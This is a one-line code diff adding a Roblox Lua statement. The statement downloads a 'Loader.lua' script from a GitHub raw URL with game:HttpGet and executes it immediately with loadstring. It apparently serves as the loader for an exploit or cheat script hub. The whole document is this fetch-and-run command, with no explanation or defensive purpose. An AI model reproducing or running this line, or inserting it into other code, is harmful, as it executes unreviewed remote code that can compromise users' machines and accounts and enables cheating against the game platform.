@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZxenoLR/Champange/refs/heads/main/Loader/Loader.lua"))()
